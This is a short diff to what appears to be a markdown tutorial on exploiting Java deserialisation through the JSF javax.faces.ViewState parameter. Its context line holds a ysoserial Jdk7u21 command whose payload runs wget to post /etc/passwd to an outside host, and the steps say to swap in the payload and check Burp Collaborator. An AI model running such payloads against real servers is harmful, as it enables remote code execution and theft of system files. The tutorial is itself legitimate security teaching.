@@ -199,8 +199,14 @@ java -jar ysoserial-master-SNAPSHOT.jar Jdk7u21 "wget --post-file /etc/passwd  h
   <img src="/images/deserialisation/desc21.png">
 </p>
 
-Replace the **javax.faces.ViewState** value with the Ysoserial generated payload and **URL Encode** it.
+* Replace the **javax.faces.ViewState** value with the Ysoserial generated payload and **URL Encode** it.
 
 <p align="center">
   <img src="/images/deserialisation/desc22.png">
+</p>
+
+* Click on Go and Observe the response in Burp Collaborator.
+
+<p align="center">
+  <img src="/images/deserialisation/desc23.png">
 </p>
